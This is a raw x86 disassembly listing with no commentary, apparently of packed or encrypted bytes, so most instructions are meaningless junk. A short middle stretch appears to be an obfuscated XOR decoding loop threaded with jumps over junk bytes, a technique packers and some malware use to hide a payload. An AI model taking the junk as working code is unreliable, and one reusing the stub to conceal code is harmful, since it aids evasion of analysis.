  405a09:	xlat   BYTE PTR ds:[ebx]
  405a0a:	js     0x405a1f
  405a0c:	push   eax
  405a0d:	out    dx,al
  405a0e:	mov    cl,BYTE PTR [ecx+0x1dc0910c]
  405a14:	imul   edx,ecx,0x350d8379
  405a1a:	and    DWORD PTR [ebp-0x2064dbf0],ecx
  405a20:	xchg   ebp,eax
  405a21:	cmp    BYTE PTR [edi+0x0],ch
  405a24:	and    al,0xe
  405a26:	repnz mov dh,0x94
  405a29:	cmp    DWORD PTR [eax+0x32],0x868a1383
  405a30:	addr16 pop edx
  405a32:	jle    0x405a6f
  405a34:	cmc    
  405a35:	pop    eax
  405a36:	sub    eax,0xb868d48f
  405a3b:	dec    edx
  405a3c:	push   cs
  405a3d:	mov    edx,0x4869935f
  405a42:	xchg   esp,eax
  405a43:	ja     0x4059f2
  405a45:	dec    eax
  405a46:	cmp    al,0xb4
  405a48:	mov    dl,0xa7
  405a4a:	call   0xcb8920a8
  405a4f:	sbb    eax,0x5d4772ab
  405a54:	mov    edx,0x1b60ed05
  405a59:	jb     0x405a14
  405a5b:	push   DWORD PTR [edx]
  405a5d:	scas   eax,DWORD PTR es:[edi]
  405a5e:	retf   0x2322
  405a61:	hlt    
  405a62:	pop    es
  405a63:	pop    esp
  405a64:	hlt    
  405a65:	into   
  405a66:	and    DWORD PTR ss:[ebx+edi*8-0x19],ebx
  405a6b:	cmp    eax,0x60e24177
  405a70:	cmp    cl,BYTE PTR [edi-0x63]
  405a73:	mov    ecx,0x50ab1108
  405a78:	cmp    eax,0x2a47fbe9
  405a7d:	xor    ebp,DWORD PTR [esi-0x5e5c4b44]
  405a83:	shl    BYTE PTR [edx-0x16aeb937],0x83
  405a8a:	repnz (bad) [ebx-0x8]
  405a8e:	pop    ebx
  405a8f:	xor    ch,dh
  405a91:	sahf   
  405a92:	mov    cl,BYTE PTR [esi-0x2a]
  405a95:	jns    0x405a57
  405a97:	mov    ah,0xf2
  405a99:	lea    esp,[ecx]
  405a9b:	nop
  405a9c:	and    ch,BYTE PTR [ebx+0x62]
  405a9f:	popa   
  405aa0:	adc    DWORD PTR [edx-0x35],esi
  405aa3:	hlt    
  405aa4:	mov    ds:0x76155773,eax
  405aa9:	nop
  405aaa:	jg     0x405a47
  405aac:	mov    BYTE PTR [esi],al
  405aae:	mov    BYTE PTR [eax+eiz*4],dh
  405ab1:	mov    al,0xd5
  405ab3:	iret   
  405ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ab5:	pop    edi
  405ab6:	imul   esi,DWORD PTR [esi],0x64ab6fe9
  405abc:	xor    dh,BYTE PTR [eax]
  405abe:	or     eax,0xc28b9717
  405ac3:	(bad)  
  405ac4:	sub    BYTE PTR [ebx-0x6b],bl
  405ac7:	xchg   ebp,eax
  405ac8:	rol    BYTE PTR [ebp-0x1a914a6b],cl
  405ace:	xlat   BYTE PTR ds:[ebx]
  405acf:	je     0x405ae0
  405ad1:	add    bl,0xe3
  405ad4:	mov    edx,0x5647ffc4
  405ad9:	xchg   ecx,eax
  405ada:	mov    bh,0x93
  405adc:	sbb    eax,0xd7379c63
  405ae1:	dec    ecx
  405ae2:	sbb    bl,BYTE PTR [esi+eax*1]
  405ae5:	cmovae esi,eax
  405ae8:	gs mov bh,0xaa
  405aeb:	and    DWORD PTR [edx],edx
  405aed:	call   0x49cd:0xcae46162
  405af4:	lods   eax,DWORD PTR ds:[esi]
  405af5:	cmp    DWORD PTR [edx+ebx*8-0xee204c4],edi
  405afc:	xor    esi,DWORD PTR [edx+0x62a4cd1c]
  405b02:	scas   eax,DWORD PTR es:[edi]
  405b03:	adc    al,0xcc
  405b05:	inc    edx
  405b06:	add    eax,0x4e75f574
  405b0b:	push   esi
  405b0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b0d:	imul   esp,DWORD PTR [edi+0x7e],0x41553e76
  405b14:	jb     0x405b80
  405b16:	ret    
  405b17:	iret   
  405b18:	fmul   DWORD PTR [edi-0x59]
  405b1c:	sbb    bl,dl
  405b1e:	adc    BYTE PTR [eax],cl
  405b20:	fidivr WORD PTR [ebx-0x42d47647]
  405b26:	cmc    
  405b27:	loope  0x405b43
  405b29:	xchg   esp,eax
  405b2a:	sbb    eax,0x49563e0e
  405b2f:	test   edx,eax
  405b31:	mov    edi,edx
  405b33:	mov    ah,0xf4
  405b35:	leave  
  405b36:	sub    dh,BYTE PTR [ebx-0x2]
  405b39:	and    dh,BYTE PTR ds:0x116a302c
  405b3f:	cmp    eax,0xb61b0fc8
  405b44:	(bad)  
  405b45:	in     al,dx
  405b46:	fwait
  405b47:	mov    edx,0xadc351
  405b4c:	mov    gs,WORD PTR [edi-0x5c]
  405b4f:	pop    ebp
  405b50:	clc    
  405b51:	dec    ebx
  405b52:	cmp    DWORD PTR [esp+ecx*4-0xf43d6d6],eax
  405b59:	dec    ebp
  405b5a:	dec    edx
  405b5b:	ret    
  405b5c:	dec    ecx
  405b5d:	push   esp
  405b5e:	mov    esp,0xa2382f02
  405b63:	hlt    
  405b64:	call   0xfa45:0xba3892f3
  405b6b:	push   ebx
  405b6c:	mov    edx,DWORD PTR [edx+0x237dc33]
  405b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b73:	inc    esi
  405b74:	cmp    dh,BYTE PTR [edi]
  405b76:	mov    dl,0xa0
  405b78:	and    DWORD PTR [esi+0x31],ebx
  405b7b:	fwait
  405b7c:	jnp    0x405b13
  405b7e:	cmp    ebx,ebx
  405b80:	mov    dh,BYTE PTR [eax-0x2f]
  405b83:	lds    esp,FWORD PTR ds:0x245f1b81
  405b89:	add    DWORD PTR [edi+0x5dc59119],edx
  405b8f:	inc    edx
  405b90:	lods   al,BYTE PTR ds:[esi]
  405b91:	aad    0x89
  405b93:	mov    eax,ds:0xc93f20ea
  405b98:	dec    edx
  405b99:	aad    0x15
  405b9b:	cdq    
  405b9c:	push   ecx
  405b9d:	cli    
  405b9e:	dec    esi
  405b9f:	and    al,0xfa
  405ba1:	xchg   esi,eax
  405ba2:	and    eax,0x43373a64
  405ba7:	out    0xc6,eax
  405ba9:	dec    esp
  405baa:	add    eax,0xbecddf46
  405baf:	or     al,0x7f
  405bb1:	mov    eax,0x17f9659f
  405bb6:	dec    ecx
  405bb7:	icebp  
  405bb8:	daa    
  405bb9:	enter  0x52fa,0xd1
  405bbd:	mov    cx,0xe89b
  405bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bc2:	idiv   cl
  405bc4:	jmp    0x405bc4
  405bc6:	cld    
  405bc7:	into   
  405bc8:	fs sbb al,0x0
  405bcb:	mov    WORD PTR [eax],ss
  405bcd:	push   0xffffffed
  405bcf:	retf   
  405bd0:	add    BYTE PTR ds:0x2fc21cee,dl
  405bd6:	push   es
  405bd7:	cwde   
  405bd8:	pop    ebp
  405bd9:	rep outs dx,DWORD PTR ds:[esi]
  405bdb:	mov    dh,0x91
  405bdd:	pop    ss
  405bde:	dec    ebp
  405bdf:	neg    BYTE PTR [edi-0x54]
  405be2:	stos   BYTE PTR es:[edi],al
  405be3:	aam    0x68
  405be5:	push   edx
  405be6:	mov    eax,0x9a0a2906
  405beb:	xchg   ecx,eax
  405bec:	mov    BYTE PTR [edi+0x2],dh
  405bef:	push   ebp
  405bf0:	dec    esp
  405bf1:	sub    DWORD PTR [ebp+0x59],ecx
  405bf4:	mov    ebx,0xd926bd6e
  405bf9:	inc    esp
  405bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bfb:	in     al,dx
  405bfc:	cmp    DWORD PTR ds:[esi+0x5a3f0472],ebp
  405c03:	dec    ebx
  405c04:	dec    esi
  405c05:	jbe    0x405c04
  405c07:	sub    cl,dh
  405c09:	sti    
  405c0a:	dec    ecx
  405c0b:	fbld   TBYTE PTR [ebp+0x1c]
  405c0e:	mov    dl,0x2b
  405c10:	clc    
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x4f5d0ed0,dx
  405c45:	cmp    eax,0x3b508b8b
  405c4a:	jle    0x405cca
  405c4c:	mov    ebp,0x857e7e71
  405c51:	sbb    edx,edi
  405c53:	sar    BYTE PTR [edi+eiz*8-0x2b5568e3],cl
  405c5a:	icebp  
  405c5b:	sbb    BYTE PTR [edx],bl
  405c5d:	adc    bl,ah
  405c5f:	cs dec esp
  405c61:	popf   
  405c62:	push   ebp
  405c63:	(bad)  
  405c65:	mov    cl,ah
  405c67:	test   al,0x74
  405c69:	adc    BYTE PTR [edi],0x5f
  405c6c:	sub    al,0x76
  405c6e:	in     eax,dx
  405c6f:	rcr    edi,0x1
  405c72:	dec    eax
  405c73:	xor    DWORD PTR [edi],edi
  405c75:	leave  
  405c76:	dec    ecx
  405c77:	fistp  DWORD PTR [esi-0x3ba09085]
  405c7d:	inc    ebx
  405c7e:	cmp    eax,DWORD PTR es:[ecx-0x43366cd1]
  405c85:	repnz inc edi
  405c87:	cmp    al,0x5f
  405c89:	fwait
  405c8a:	aad    0x14
  405c8c:	xchg   ebp,eax
  405c8d:	mov    edi,0xed0d811f
  405c92:	add    cl,cl
  405c94:	fs mov ch,0x46
  405c97:	dec    edi
  405c98:	pop    esp
  405c99:	mov    ebx,0x9a509934
  405c9e:	sub    dl,dh
  405ca0:	xor    cl,BYTE PTR [ebx]
  405ca2:	call   0x7167:0xff2ea21c
  405ca9:	and    DWORD PTR [ecx],edi
  405cab:	out    0x34,eax
  405cad:	push   cs
  405cae:	mov    ds:0x92cd8ded,eax
  405cb3:	ins    DWORD PTR es:[edi],dx
  405cb4:	mov    dh,0x3c
  405cb6:	aam    0x87
  405cb8:	adc    esi,DWORD PTR [edx]
  405cba:	sub    BYTE PTR [ecx+edx*8+0x3e],cl
  405cbe:	imul   eax,DWORD PTR ds:0xff90f559,0x93e2bfca
  405cc8:	aad    0x96
  405cca:	jnp    0x405cb7
  405ccc:	push   0xf
  405cce:	xchg   ebx,eax
  405ccf:	push   eax
  405cd0:	or     eax,0x4ca39208
  405cd5:	jmp    0x6b3b:0xf83e5fc4
  405cdc:	aam    0xba
  405cde:	xchg   esi,eax
  405cdf:	xor    eax,0x8c6955e4
  405ce4:	repnz push es
  405ce6:	mov    bh,0xbe
  405ce8:	mov    BYTE PTR [ebx-0x178468ce],al
  405cee:	(bad)
  405cf1:	jmp    0xc2f1:0x28d22291
  405cf8:	adc    al,0xd7
  405cfa:	and    eax,0xc3944873
  405cff:	leave  
  405d00:	mov    esi,0x658a6496
  405d05:	loop   0x405d58
  405d07:	ja     0x405d08
  405d09:	or     al,0xbc
  405d0b:	mov    dh,0x70
  405d0d:	ret    0x8d12
  405d10:	mov    cl,0x8e
  405d12:	fs pop esp
  405d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d15:	je     0x405cb2
  405d17:	scas   al,BYTE PTR es:[edi]
  405d18:	mov    dl,0x94
  405d1a:	in     al,dx
  405d1b:	lods   al,BYTE PTR ds:[esi]
  405d1c:	cmp    DWORD PTR [ebx],edx
  405d1e:	add    al,0xec
  405d20:	adc    DWORD PTR [ebp+0x4291f3fa],edi
  405d26:	dec    eax
  405d27:	std    
  405d28:	mov    eax,ds:0x5c583023
  405d2d:	xor    DWORD PTR [edx-0x7c],ecx
  405d30:	inc    eax
  405d31:	mov    ah,0x74
  405d33:	jecxz  0x405daa
  405d35:	(bad)  
  405d36:	imul   BYTE PTR [edi+0x28292e6]
  405d3c:	dec    esp
  405d3d:	or     eax,0xe0e85e68
  405d42:	(bad)  
  405d43:	adc    DWORD PTR [esi+0x2841e161],esp
  405d49:	inc    edi
  405d4a:	dec    ebp
  405d4b:	ja     0x405d39
  405d4d:	mov    al,0xbd
  405d4f:	dec    ebx
  405d50:	mov    ch,0x56
  405d52:	ins    DWORD PTR es:[edi],dx
  405d53:	dec    ebx
  405d54:	shl    BYTE PTR [ecx],1
  405d56:	push   edx
  405d57:	pop    esp
  405d58:	or     DWORD PTR [ebp-0x2681ef97],esi
  405d5e:	cmp    BYTE PTR [edx+0x59cbb3f5],al
  405d64:	and    DWORD PTR [esi+esi*4-0x7d],eax
  405d68:	xor    bh,BYTE PTR [eax-0x2e]
  405d6b:	and    eax,0xe37f967
  405d70:	cmp    DWORD PTR [ebx-0x3d51c3a3],esp
  405d76:	lahf   
  405d77:	mov    ds:0x9fa24ef8,al
  405d7c:	jg     0x405db7
  405d7e:	jmp    0xc4d3da3b
  405d83:	push   ds
  405d84:	mov    ah,0x27
  405d86:	ret    0xb71b
  405d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d8a:	pop    edx
  405d8b:	push   cs
  405d8c:	loopne 0x405d72
  405d8e:	and    eax,0x28ade087
  405d93:	xchg   ebp,eax
  405d94:	adc    DWORD PTR [ecx+eiz*4],ebp
  405d97:	enter  0x4385,0x99
  405d9b:	out    0xb1,eax
  405d9d:	pop    esi
  405d9e:	retf   0xd1e4
  405da1:	or     eax,0xe00f9eee
  405da6:	lock ret 0xd00a
  405daa:	in     eax,0x7c
  405dac:	xor    BYTE PTR [ecx+0x492e8853],ah
  405db2:	xor    BYTE PTR ds:0xe33e04fb,bl
  405db8:	mov    ds:0xa706223d,eax
  405dbd:	mov    esi,0xd9c44019
  405dc2:	and    ebp,edx
  405dc4:	leave  
  405dc5:	(bad)  
  405dc6:	pop    ecx
  405dc7:	mov    eax,ds:0x362d7e1d
  405dcc:	or     DWORD PTR [ebx],ebx
  405dce:	data16 imul BYTE PTR [edi]
  405dd1:	xchg   DWORD PTR [ecx+0x417216ca],edx
  405dd7:	pop    ecx
  405dd8:	ins    DWORD PTR es:[edi],dx
  405dd9:	jg     0x405e15
  405ddb:	cmp    eax,esp
  405ddd:	dec    ebp
  405dde:	enter  0x1a63,0xfc
  405de2:	test   BYTE PTR [edx+edi*8],ch
  405de5:	lds    esi,FWORD PTR [eax+0x306ad5da]
  405deb:	es jp  0x405e55
  405dee:	and    BYTE PTR [edx-0x27180c42],0xc9
  405df5:	ror    BYTE PTR [ebx],1
  405df7:	pop    ebp
  405df8:	shl    BYTE PTR [ecx-0x5fc5c7e0],0xff
  405dff:	push   eax
  405e00:	dec    esp
  405e01:	mov    ds:0xa91ba670,al
  405e06:	lods   al,BYTE PTR ds:[esi]
  405e07:	ret    0x6edb
  405e0a:	mov    al,ds:0xff705987
  405e0f:	lahf   
  405e10:	inc    ebx
  405e11:	fmul   DWORD PTR [ebp-0x9a763be]
  405e17:	pop    edx
  405e18:	and    bh,bl
  405e1a:	lds    edi,FWORD PTR [eax+0x43]
  405e1d:	cmp    bh,al
  405e1f:	ror    BYTE PTR [esi+edi*4],0xd8
  405e23:	xchg   ebp,eax
  405e24:	fadd   DWORD PTR [edx+0x7]
  405e27:	cmp    al,0xa
  405e29:	loope  0x405e04
  405e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e2c:	sti    
  405e2d:	xchg   esp,eax
  405e2e:	push   ebp
  405e2f:	ror    DWORD PTR [edi+0x35da0def],cl
  405e35:	and    eax,ecx
  405e37:	repnz push edi
  405e39:	xor    al,0xb9
  405e3b:	lea    edi,ds:0x4d438adb
  405e41:	xchg   edi,eax
  405e42:	retf   
  405e43:	and    bh,BYTE PTR [esi+0x18]
  405e46:	dec    eax
  405e47:	test   DWORD PTR [eax-0x4d982cd5],edx
  405e4d:	(bad)  
  405e4f:	je     0x405e96
  405e51:	cmp    BYTE PTR [ecx],0xc5
  405e54:	dec    ecx
  405e55:	(bad)  [eax+0x5f]
  405e58:	and    ebp,DWORD PTR [eax-0x7b2a3e23]
  405e5e:	add    DWORD PTR [edx-0x33],0xffffffbc
  405e62:	lock pop edi
  405e64:	(bad)  
  405e65:	icebp  
  405e66:	ja     0x405edb
  405e68:	adc    ebx,DWORD PTR [ebp+0x37]
  405e6b:	imul   eax,DWORD PTR [ecx],0xffffffe2
  405e6e:	rcr    edx,0x19
  405e71:	scas   eax,DWORD PTR es:[edi]
  405e72:	lahf   
  405e73:	retf   
  405e74:	or     dh,ah
  405e76:	test   BYTE PTR [esi-0x2a1f2c18],dh
  405e7c:	jne    0x405ed6
  405e7e:	cmp    al,0xd6
  405e80:	imul   esp,DWORD PTR [edx],0xac1fccdd
  405e86:	adc    dh,BYTE PTR [edi+0x635f77ae]
  405e8c:	in     al,0x61
  405e8e:	aad    0xcd
  405e90:	or     BYTE PTR [ebp+0x5f],bl
  405e93:	call   0xa4b7:0xb2992d5b
  405e9a:	es jge 0x405eca
  405e9d:	mov    eax,ds:0x26f5686c
  405ea2:	mov    al,ds:0xaec81397
  405ea7:	ficomp WORD PTR [ebx-0x40]
  405eaa:	fs lock leave 
  405ead:	cmp    dl,al
  405eaf:	ret    0x8323
  405eb2:	mov    edx,DWORD PTR [esi]
  405eb4:	mov    ch,0xdc
  405eb6:	jo     0x405e4a
  405eb8:	adc    DWORD PTR [ebp-0x4043fde4],ebp
  405ebe:	jns    0x405eb7
  405ec0:	(bad)  
  405ec1:	(bad)  
  405ec2:	stc    
  405ec3:	xlat   BYTE PTR ds:[ebx]
  405ec4:	mov    bl,0xb2
  405ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ec7:	cmc    
  405ec8:	and    ebp,ecx
  405eca:	inc    DWORD PTR [edx-0x69ed0a07]
  405ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ed1:	nop
  405ed2:	or     eax,DWORD PTR [ecx]
  405ed4:	sub    ecx,ebx
  405ed6:	mov    eax,ds:0x9bbc1f65
  405edb:	cwde   
  405edc:	or     dh,dh
  405ede:	push   ds
  405edf:	jl     0x405ec1
  405ee1:	ins    BYTE PTR es:[edi],dx
  405ee2:	mov    BYTE PTR [ecx],bh
  405ee4:	out    0x67,al
  405ee6:	and    ebp,DWORD PTR [edx]
  405ee8:	mov    eax,0xf4b268de
  405eed:	push   edx
  405eee:	(bad)  
  405eef:	repz add esp,DWORD PTR [ebp-0x70]
  405ef3:	cmp    BYTE PTR [edi+0x3243ffe9],0xb4
  405efa:	mov    BYTE PTR [esi+0x50c412a5],cl
  405f00:	dec    ebx
  405f01:	leave  
  405f02:	sti    
  405f03:	inc    esi
  405f04:	retf   
  405f05:	aaa    
  405f06:	clc    
  405f07:	inc    edi
  405f08:	dec    edx
  405f09:	je     0x405f3b
  405f0b:	fmul   DWORD PTR [ebx+0x4e]
  405f0e:	dec    eax
  405f0f:	pop    edx
  405f10:	in     eax,0xe2
  405f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f13:	xor    dh,BYTE PTR [ecx-0x66]
  405f16:	rcl    bl,cl
  405f18:	inc    ecx
  405f19:	cmc    
  405f1a:	sub    ecx,DWORD PTR [ebp+0x59945199]
  405f20:	sbb    BYTE PTR [esi+ebx*4-0x6d2b7fa8],ah
  405f27:	mov    ds:0xfba724db,eax
  405f2c:	into   
  405f2d:	jne    0x405f35
  405f2f:	push   ds
  405f30:	(bad)  
  405f31:	xlat   BYTE PTR ds:[ebx]
  405f32:	sbb    esi,DWORD PTR [ecx+esi*1]
  405f35:	and    eax,0xb9b7e846
  405f3a:	adc    eax,0x38948997
  405f40:	cmp    al,ah
  405f42:	push   esp
  405f43:	jl     0x405ee2
  405f45:	xor    esi,DWORD PTR [esi]
  405f47:	mov    al,BYTE PTR [ebx+0x412d7ecb]
  405f4d:	sub    BYTE PTR [eax-0x72da8e2d],al
  405f53:	xchg   esp,eax
  405f54:	(bad)  
  405f55:	pushf  
  405f56:	mov    al,ds:0xeebafb5b
  405f5b:	cmc    
  405f5c:	adc    eax,DWORD PTR [esi+edi*8-0x20c7b0ad]
  405f63:	push   es
  405f64:	ss or  al,0xa3
  405f67:	add    BYTE PTR [edx+esi*2-0xd707fab],cl
  405f6e:	cmp    ecx,DWORD PTR [eax+0x32f40d33]
  405f74:	call   0xf8d071b
  405f79:	aas    
  405f7a:	not    BYTE PTR [eax+0x22b2713c]
  405f80:	cmp    ch,al
  405f82:	sbb    eax,0x767b25cc
  405f87:	jle    0x405fe1
  405f89:	and    eax,0xbaa0a4c0
  405f8e:	jnp    0x40600e
  405f90:	add    al,0x7b
  405f92:	jae    0x405f48
  405f94:	mov    ch,0x4e
  405f96:	fidiv  WORD PTR [edi+eax*1]
  405f99:	push   ebx
  405f9a:	mov    bh,0xbc
  405f9c:	cmp    al,0x5
  405f9e:	stos   DWORD PTR es:[edi],eax
  405f9f:	lods   al,BYTE PTR ds:[esi]
  405fa0:	sbb    BYTE PTR ds:[edx],cl
  405fa3:	out    dx,al
  405fa4:	(bad)  [esi+0x3bb48453]
  405faa:	cwde   
  405fab:	xor    BYTE PTR [edi+0x725aee],cl
  405fb1:	xlat   BYTE PTR ds:[ebx]
  405fb2:	cs into 
  405fb4:	aad    0x69
  405fb6:	cmp    ah,al
  405fb8:	icebp  
  405fb9:	pop    ecx
  405fba:	out    dx,al
  405fbb:	mov    bh,0x7f
  405fbd:	je     0x405ffe
  405fbf:	ins    BYTE PTR es:[edi],dx
  405fc0:	jle    0x405fb6
  405fc2:	cdq    
  405fc3:	xor    al,0xaf
  405fc5:	repz cmp al,0xe4
  405fc8:	icebp  
  405fc9:	cdq    
  405fca:	adc    al,0x1c
  405fcc:	test   esi,ecx
  405fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fcf:	jle    0x405ff1
  405fd1:	add    DWORD PTR [ebx],eax
  405fd3:	adc    DWORD PTR [edi-0x63],0xffffffed
  405fd7:	test   eax,0x9f7bad7
  405fdc:	and    esi,ebp
  405fde:	cmp    ebx,DWORD PTR [ebx+edi*2+0x582074b9]
  405fe5:	call   0xf1ec675c
  405fea:	pop    es
  405feb:	xor    eax,0x9ea806a8
  405ff0:	fsubr  DWORD PTR [ebp-0x75b8f95a]
  405ff6:	(bad)  
  405ff7:	loope  0x405fff
  405ff9:	add    cl,al
  405ffb:	xor    eax,0x16d7d8c2
  406000:	jl     0x406012
  406002:	dec    edx
  406003:	aad    0xce
  406005:	mov    esp,0x1b2cdba0
  40600a:	add    bl,BYTE PTR [ebp+eiz*2-0x1fc20ee]
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406057:	retf   0x205
  40605a:	lahf   
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0xee7e7e71
  406063:	(bad)  
  406065:	faddp  st(3),st
  406067:	neg    BYTE PTR [edi-0x31e43536]
  40606d:	cld    
  40606e:	jnp    0x4060b3
  406070:	loope  0x4060cd
  406072:	sbb    eax,0x5fcc413f
  406077:	aaa    
  406078:	lods   al,BYTE PTR ds:[esi]
  406079:	xchg   ecx,eax
  40607a:	loope  0x406037
  40607c:	pop    eax
  40607d:	mov    cl,0xa5
  40607f:	inc    ecx
  406080:	call   0xe3be432e
  406085:	mov    BYTE PTR [edi+0x4b449d6d],cl
  40608b:	(bad)  
  40608c:	outs   dx,DWORD PTR ds:[esi]
  40608e:	rcr    BYTE PTR [eax+0x51],cl
  406091:	xor    edx,DWORD PTR ds:0xbf09b06b
  406097:	dec    ebx
  406098:	enter  0xe870,0x4
  40609c:	in     al,dx
  40609d:	stos   DWORD PTR es:[edi],eax
  40609e:	fist   DWORD PTR [esp+ecx*4]
  4060a1:	mov    ds:0x2229a862,eax
  4060a6:	jmp    0xac2c:0x2ea26953
  4060ad:	scas   eax,DWORD PTR es:[edi]
  4060ae:	call   0x514072de
  4060b3:	outs   dx,DWORD PTR ds:[esi]
  4060b4:	mov    DWORD PTR [eax+ebp*8],edi
  4060b7:	jns    0x40607f
  4060b9:	call   0x4c37:0x63b70b3c
  4060c0:	pop    edx
  4060c1:	xlat   BYTE PTR ds:[ebx]
  4060c2:	fild   QWORD PTR [eax+0x91893a]
  4060c8:	ins    BYTE PTR es:[edi],dx
  4060c9:	mov    DWORD PTR [edx-0x5e],esp
  4060cc:	add    dh,bl
  4060ce:	in     eax,dx
  4060cf:	imul   esp,DWORD PTR [edx+0x3e],0x7f03ab95
  4060d6:	inc    esp
  4060d7:	mov    WORD PTR [ebp+ecx*1-0x63540c41],es
  4060de:	adc    BYTE PTR [ecx+esi*2+0x416db2b],0x3
  4060e6:	push   eax
  4060e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060e8:	les    ecx,FWORD PTR [edx-0x2f285c6f]
  4060ee:	mov    al,ds:0x30fba57c
  4060f3:	jb     0x4060f5
  4060f5:	cli    
  4060f6:	stos   DWORD PTR es:[edi],eax
  4060f7:	or     DWORD PTR [edi-0x4ff3191a],ebp
  4060fd:	mov    DWORD PTR [esi-0x3b4ddfc7],edx
  406103:	retf   0x9324
  406106:	iret   
  406107:	push   edi
  406108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406109:	pushf  
  40610a:	aaa    
  40610b:	(bad)  
  40610c:	hlt    
  40610d:	and    eax,0x75d074fc
  406112:	dec    ecx
  406113:	pop    eax
  406114:	and    eax,0x6cc9db68
  406119:	mov    dl,0x2
  40611b:	mov    edi,0x945aa64
  406120:	jbe    0x4060a4
  406122:	test   DWORD PTR [ecx+edi*2-0x4330c202],ebx
  406129:	xchg   edi,eax
  40612a:	test   al,0x59
  40612c:	cmp    esi,esi
  40612e:	mov    ebx,0x5ea48f1e
  406133:	ins    BYTE PTR es:[edi],dx
  406134:	pop    ebx
  406135:	jmp    0x40612c
  406137:	xor    edi,eax
  406139:	std    
  40613a:	xchg   ebx,eax
  40613b:	push   ecx
  40613c:	push   ds
  40613d:	pop    esi
  40613e:	repz mov ?,WORD PTR [edi]
  406141:	enter  0xc05d,0x32
  406145:	add    BYTE PTR [eax+0x287901a3],bl
  40614b:	inc    ebp
  40614c:	mov    bl,0xa5
  40614e:	sbb    BYTE PTR [eax],0xa3
  406151:	sbb    DWORD PTR [ebp+0x6d99da28],ebp
  406157:	xchg   cl,dh
  406159:	pop    ds
  40615a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40615b:	retf   0xa58c
  40615e:	xchg   ch,ah
  406160:	mov    dl,0x8d
  406162:	mov    al,ds:0x4f1a272c
  406167:	js     0x406137
  406169:	jo     0x4060f4
  40616b:	sub    DWORD PTR [ebp+eiz*4+0x7a],edi
  40616f:	sti    
  406170:	test   al,0x21
  406172:	stos   BYTE PTR es:[edi],al
  406173:	xor    bl,BYTE PTR [eax]
  406175:	arpl   WORD PTR [ebp+0x1a],cx
  406178:	mov    bl,0x92
  40617a:	hlt    
  40617b:	jl     0x4061c2
  40617d:	das    
  40617e:	fdivp  st(6),st
  406180:	mov    bl,BYTE PTR [ecx+0xe]
  406183:	out    dx,eax
  406184:	adc    al,0x9
  406186:	add    al,al
  406188:	xor    al,0xa2
  40618a:	icebp  
  40618b:	enter  0x69e5,0x41
  40618f:	sbb    edx,DWORD PTR [ebx]
  406191:	daa    
  406192:	inc    eax
  406193:	inc    ecx
  406194:	(bad)  
  406195:	(bad)  [eax+0x21f43f79]
  40619b:	dec    esi
  40619c:	rep stos BYTE PTR es:[edi],al
  40619e:	(bad)  
  40619f:	mov    cl,0x19
  4061a1:	enter  0x65f3,0xbd
  4061a5:	rdpmc  
  4061a7:	scas   eax,DWORD PTR es:[edi]
  4061a8:	mov    WORD PTR [ebp-0x57],?
  4061ab:	jp     0x4061bd
  4061ad:	scas   eax,DWORD PTR es:[edi]
  4061ae:	ins    DWORD PTR es:[edi],dx
  4061af:	adc    BYTE PTR [esi],ch
  4061b1:	jae    0x406225
  4061b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b4:	je     0x406139
  4061b6:	jo     0x40621e
  4061b8:	imul   BYTE PTR [ebx+0x4ba166e3]
  4061be:	pusha  
  4061bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061c0:	jo     0x4061cc
  4061c2:	push   ebp
  4061c3:	nop
  4061c4:	mov    edx,0x9a9f09d3
  4061c9:	repnz push eax
  4061cb:	jl     0x4061bc
  4061cd:	in     al,0x2
  4061cf:	xchg   ebx,eax
  4061d0:	mov    edi,0x118be229
  4061d5:	ret    0xdb9f
  4061d8:	inc    ebx
  4061d9:	gs pop ds
  4061db:	ss jne 0x40623b
  4061de:	xchg   DWORD PTR [edi-0x6d],eax
  4061e1:	test   dl,al
  4061e3:	jmp    0x6204:0x4d5e91b6
  4061ea:	push   ebx
